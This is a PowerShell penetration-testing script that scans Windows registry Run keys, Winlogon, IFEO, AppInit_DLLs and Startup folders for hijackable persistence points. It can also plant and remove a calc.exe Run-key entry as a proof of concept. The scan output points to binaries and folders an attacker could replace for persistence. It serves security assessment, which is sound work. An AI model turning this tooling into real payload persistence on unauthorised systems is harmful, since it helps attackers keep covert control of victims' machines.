<#
.SYNOPSIS
    Registry Persistence PoC — Demonstrate persistence via common registry Run keys.

.DESCRIPTION
    Tests whether the application or its installer leaves writable registry
    persistence keys that an attacker can hijack.

    Also demonstrates common persistence locations for reporting.

    MITRE ATT&CK: T1547.001 — Registry Run Keys / Startup Folder

.PARAMETER Action
    scan   — Check all persistence locations for writable/hijackable entries
    plant  — Write a PoC entry (calc.exe) to a specified location
    clean  — Remove the PoC entry

.PARAMETER AppName
    Filter scan results to a specific application

.EXAMPLE
    .\registry_persistence.ps1 -Action scan
    .\registry_persistence.ps1 -Action scan -AppName "TargetApp"
    .\registry_persistence.ps1 -Action plant -Location RunKey
    .\registry_persistence.ps1 -Action clean
#>

param(
    [ValidateSet("scan", "plant", "clean")]
    [string]$Action = "scan",
    [string]$AppName = "",
    [string]$Location = "RunKey"
)

$pocName = "VAPT_PoC_Persistence"
$pocCmd = "calc.exe"

# All known persistence registry locations
$persistenceKeys = @(
    @{Name="HKCU Run";         Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Run";          Priv="User"},
    @{Name="HKCU RunOnce";     Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce";      Priv="User"},
    @{Name="HKLM Run";         Path="HKLM:\Software\Microsoft\Windows\CurrentVersion\Run";          Priv="Admin"},
    @{Name="HKLM RunOnce";     Path="HKLM:\Software\Microsoft\Windows\CurrentVersion\RunOnce";      Priv="Admin"},
    @{Name="HKCU RunServices"; Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\RunServices";  Priv="User"},
    @{Name="HKLM RunServices"; Path="HKLM:\Software\Microsoft\Windows\CurrentVersion\RunServices";  Priv="Admin"},
    @{Name="Winlogon Shell";   Path="HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon";  Priv="Admin"; Value="Shell"},
    @{Name="Winlogon Userinit";Path="HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Winlogon";  Priv="Admin"; Value="Userinit"},
    @{Name="IFEO Debugger";    Path="HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"; Priv="Admin"; Note="Subkey per exe"},
    @{Name="AppInit_DLLs";     Path="HKLM:\Software\Microsoft\Windows NT\CurrentVersion\Windows";   Priv="Admin"; Value="AppInit_DLLs"},
    @{Name="HKCU Explorer Run";Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"; Priv="User"},
    @{Name="HKLM Explorer Run";Path="HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run"; Priv="Admin"}
)

switch ($Action) {
    "scan" {
        Write-Host "`n[*] Registry Persistence Scanner`n" -ForegroundColor Cyan

        foreach ($key in $persistenceKeys) {
            if (-not (Test-Path $key.Path)) { continue }

            $props = Get-ItemProperty -Path $key.Path -ErrorAction SilentlyContinue
            if (-not $props) { continue }

            $entries = $props.PSObject.Properties | Where-Object {
                $_.Name -notmatch "^PS(Path|ParentPath|ChildName|Provider|Drive)$"
            }

            if ($key.Value) {
                $entries = $entries | Where-Object { $_.Name -eq $key.Value }
            }

            if ($AppName) {
                $entries = $entries | Where-Object {
                    $_.Name -imatch $AppName -or $_.Value -imatch $AppName
                }
            }

            foreach ($entry in $entries) {
                $color = if ($key.Priv -eq "User") { "Red" } else { "Yellow" }
                Write-Host "[$($key.Priv.ToUpper())] $($key.Name): $($entry.Name)" -ForegroundColor $color
                Write-Host "  Path: $($key.Path)"
                Write-Host "  Value: $($entry.Value)"

                # Check if the target binary exists and is writable
                $binaryPath = $entry.Value -replace '"', '' -replace '\s+(-|/).*$', ''
                if (Test-Path $binaryPath) {
                    try {
                        $acl = Get-Acl $binaryPath
                        $writable = $acl.Access | Where-Object {
                            ($_.IdentityReference -match "Users|Everyone|Authenticated Users") -and
                            ($_.FileSystemRights -match "Write|FullControl|Modify")
                        }
                        if ($writable) {
                            Write-Host "  [!!!] BINARY IS WRITABLE — replace for persistence hijack" -ForegroundColor Red
                        }
                    } catch {}
                } elseif ($binaryPath -and $binaryPath -notmatch "^(explorer|userinit)") {
                    Write-Host "  [!] Binary not found — ghost entry, replaceable" -ForegroundColor Yellow
                }
                Write-Host ""
            }
        }

        # Also check Startup folders
        Write-Host "`n--- Startup Folders ---" -ForegroundColor Yellow
        $startupPaths = @(
            "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup",
            "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp"
        )
        foreach ($sp in $startupPaths) {
            if (Test-Path $sp) {
                $items = Get-ChildItem $sp -ErrorAction SilentlyContinue
                foreach ($item in $items) {
                    Write-Host "[STARTUP] $($item.FullName)" -ForegroundColor Yellow
                }
                # Check writable
                $testFile = Join-Path $sp ".vapt_test_$(Get-Random)"
                try {
                    [System.IO.File]::WriteAllText($testFile, "test")
                    Remove-Item $testFile -Force
                    Write-Host "  [!] Startup folder WRITABLE — drop .bat/.lnk for persistence" -ForegroundColor Red
                } catch {}
            }
        }
    }

    "plant" {
        Write-Host "[*] Planting PoC persistence entry..." -ForegroundColor Yellow
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        Set-ItemProperty -Path $regPath -Name $pocName -Value $pocCmd
        Write-Host "[+] Created: $regPath\$pocName = $pocCmd" -ForegroundColor Green
        Write-Host "[*] calc.exe will run on next login. Clean with -Action clean"
    }

    "clean" {
        Write-Host "[*] Cleaning PoC entries..." -ForegroundColor Yellow
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
        try {
            Remove-ItemProperty -Path $regPath -Name $pocName -ErrorAction Stop
            Write-Host "[+] Removed: $regPath\$pocName" -ForegroundColor Green
        } catch {
            Write-Host "[-] Entry not found (already clean)" -ForegroundColor Gray
        }
    }
}
